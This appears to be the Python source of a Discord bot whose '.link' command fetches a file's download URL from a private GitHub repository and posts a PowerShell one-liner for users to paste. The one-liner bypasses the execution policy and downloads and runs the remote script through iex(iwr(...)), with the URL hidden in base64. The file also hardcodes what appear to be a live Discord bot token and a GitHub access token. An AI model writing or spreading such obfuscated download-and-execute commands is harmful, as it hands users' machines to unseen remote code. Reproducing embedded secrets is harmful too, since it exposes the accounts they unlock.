import discord
from discord.ext import commands
import aiohttp
import io
import os
import base64
import urllib.parse

# Configuration
TOKEN = os.getenv("DISCORD_TOKEN", "MTQ1NzE1ODE5NDU2NzU4MTcyMA.Gut-zF.SUPfbvtim9Ex4qz6Gd3abMwqu9ZwU9s-ecWkbk")
GITHUB_RAW_URL = os.getenv("GITHUB_RAW_URL", "https://raw.githubusercontent.com/jigsuu/CLEANER-FINAL/main/CLEANER%20FINAL%20PRIVATE")
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN", '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')

# Setup Intents
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='.', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user} (ID: {bot.user.id})')

@bot.command()
@commands.cooldown(1, 259200, commands.BucketType.user)
async def link(ctx, *, filepath: str = None):
    # Default to the specific file if no path provided
    target_path = filepath if filepath else "CLEANER FINAL PRIVATE"
    
    # Use GitHub API to get the dynamic download URL (with token)
    api_url = f"https://api.github.com/repos/jigsuu/CLEANER-FINAL/contents/{urllib.parse.quote(target_path, safe='/')}?ref=main"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}

    async with aiohttp.ClientSession() as session:
        async with session.get(api_url, headers=headers) as resp:
            if resp.status == 200:
                data = await resp.json()
                # Ensure it's a file (dict) and not a directory (list)
                if isinstance(data, dict):
                    download_url = data.get("download_url")
                    if download_url:
                        encoded_url = base64.b64encode(download_url.encode('utf-8')).decode('utf-8')
                        cmd = f"powershell -ExecutionPolicy Bypass -Command \"[Net.ServicePointManager]::SecurityProtocol = 3072; iex(iwr([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{encoded_url}')))).Content\""
                        await ctx.send(f"```powershell\n{cmd}\n```")
                    else:
                        await ctx.send("No download URL found.")
                else:
                    await ctx.send("Path is a directory.")
            else:
                await ctx.send(f"Error fetching URL: {resp.status}")

@link.error
async def link_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        days = int(error.retry_after // 86400)
        hours = int((error.retry_after % 86400) // 3600)
        await ctx.send(f"You are on cooldown. Try again in {days} days and {hours} hours.")

bot.run(TOKEN)
